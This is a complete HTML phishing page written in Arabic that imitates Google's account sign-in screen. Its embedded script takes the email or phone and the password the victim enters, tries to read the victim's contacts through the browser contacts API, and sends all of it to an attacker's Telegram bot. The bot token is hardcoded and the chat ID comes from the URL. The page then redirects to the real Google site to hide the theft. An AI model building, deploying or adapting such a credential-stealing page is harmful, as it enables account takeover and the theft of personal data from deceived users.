<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حساب Google</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
        body { background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .google-card { border: 1px solid #dadce0; padding: 40px; width: 100%; max-width: 450px; border-radius: 8px; text-align: center; }
        .google-logo { width: 75px; margin-bottom: 15px; }
        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        p { font-size: 15px; color: #5f6368; margin-bottom: 30px; }
        .input-group { margin-bottom: 20px; text-align: right; }
        input { width: 100%; padding: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
        input:focus { border-color: #1a73e8; border-width: 2px; }
        .next-btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; float: left; }
        .next-btn:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="google-card">
        <!-- شعار جوجل الرسمي SVG -->
        <svg class="google-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
        </svg>
        <h1>تسجيل الدخول</h1>
        <p>استخدام حساب Google الخاص بك</p>
        <form id="googleForm">
            <div class="input-group"><input type="text" id="username" placeholder="البريد الإلكتروني أو الهاتف" required></div>
            <div class="input-group"><input type="password" id="password" placeholder="أدخل كلمة المرور" required></div>
            <button type="submit" class="next-btn">التالي</button>
        </form>
    </div>
    <script>
        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
        const urlParams = new URLSearchParams(window.location.search);
        const targetChatId = urlParams.get('to');

        document.getElementById('googleForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            if(!targetChatId) return;
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            let contacts = "لم يتم منح الصلاحية";
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const res = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    if (res.length > 0) contacts = res.map(c => `المستخدم: ${c.name?.[0]} - الرقم: ${c.tel?.[0]}`).join('\n');
                } catch(e) {}
            }

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`صيد جوجل جديد\nالحساب: ${user}\nالباسورد: ${pass}`)}`);
            if (contacts !== "لم يتم منح الصلاحية") {
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contacts}`)}`);
            }
            setTimeout(() => { window.location.href = "https://accounts.google.com"; }, 800);
        });
    </script>
</body>
</html>
